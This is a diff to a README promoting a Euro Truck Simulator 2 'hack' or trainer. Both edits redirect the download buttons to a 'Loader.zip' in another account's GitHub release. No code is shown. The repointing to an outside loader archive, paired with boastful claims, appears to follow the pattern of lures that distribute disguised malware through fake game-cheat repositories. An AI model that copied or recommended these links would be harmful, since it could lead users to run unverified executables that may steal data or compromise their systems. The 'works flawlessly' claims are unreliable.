@@ -26,7 +26,7 @@ I built the most advanced ETS 2 trainer out there. All modules work flawlessly i
 
 ## 🔗 Download
 
-[![Download ETS 2 Hack 2026](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=00CED1)](https://github.com/BlazeKazekage/release/releases/download/1/Loader.zip)
+[![Download ETS 2 Hack 2026](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=00CED1)](https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip)
 
 ---
 
@@ -157,7 +157,7 @@ I built the most advanced ETS 2 trainer out there. All modules work flawlessly i
 
 ## 📥 Download Euro Truck Simulator 2 Hack 2026
 
-[![Download Now](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=00CED1)](../../releases)
+[![Download Now](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=00CED1)](https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip)
 
 ---
 
